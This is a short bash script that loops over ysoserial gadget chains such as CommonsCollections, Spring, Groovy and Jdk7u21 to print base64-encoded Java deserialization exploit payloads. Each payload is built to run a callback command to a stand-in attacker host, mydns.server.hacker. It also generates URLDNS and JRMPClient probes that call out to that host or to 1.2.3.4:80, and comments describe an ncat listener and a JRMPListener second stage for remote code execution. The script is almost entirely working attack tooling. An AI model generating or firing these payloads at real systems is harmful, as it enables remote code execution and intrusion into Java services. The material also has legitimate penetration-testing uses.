# @author LongCat (Pichaya Morimoto) / tested on MacOS
# best generic RCE payload: Jdk7u21 (when JDK version <= 7u21)
# best probe payload (if DNS enabled): URLDNS, JRMPClient

# [+] How to get the latest jar?
# $ git clone https://github.com/frohoff/ysoserial.git && cd ysoserial
# $ mvn -DskipTests clean package
# $ ls target/ysoserial-0.0.6-SNAPSHOT-all.jar

# you don't need to provide full path like /usr/bin/wget /usr/bin/nslookup /bin/ping
cmdz="ping mydns.server.hacker"

ysoserial="/path/to/ysoserial-0.0.6-SNAPSHOT-all.jar"
payloads=("BeanShell1" "Clojure" "CommonsBeanutils1" "CommonsCollections1" "CommonsCollections2" "CommonsCollections3" "CommonsCollections4" "CommonsCollections5" "CommonsCollections6" "Groovy1" "Hibernate1" "Hibernate2" "JSON1" "Jdk7u21" "MozillaRhino1" "ROME" "Spring1" "Spring2")
for i in "${payloads[@]}"
do
	echo "$i"
	java -jar ${ysoserial} ${i} "$cmdz" |base64
	echo "---------------------------------------------------------------------"
done

echo "URLDNS"
java -jar ${ysoserial} "URLDNS" "http://mydns.server.hacker" |base64
echo "---------------------------------------------------------------------"
# For JRMPClient second stage RCE: 
# java -cp $ysoserial ysoserial.exploit.JRMPListener 80 CommonsCollections1 $cmdz

echo "JRMPClient 1 (DNS)"
echo "---------------------------------------------------------------------"
java -jar ${ysoserial} "JRMPClient" "mydns.server.hacker:80" |base64
echo "JRMPClient 2 (TCP/80)"
# ncat -lvp 80
java -jar ${ysoserial} "JRMPClient" "1.2.3.4:80" |base64
echo "---------------------------------------------------------------------"

# excluded:
# "FileUpload1"  
# "Wicket1"
# "Jython1" 
# "JBossInterceptors1" requires slf4j-simple-1.6.1.jar
# "JavassistWeld1" requires slf4j-simple-1.6.1.jar
# "C3P0" argument is base_url:classname 
# "Myfaces2" argument is base_url:classname 
# "Myfaces1" argument is 'an EL expression to execute'
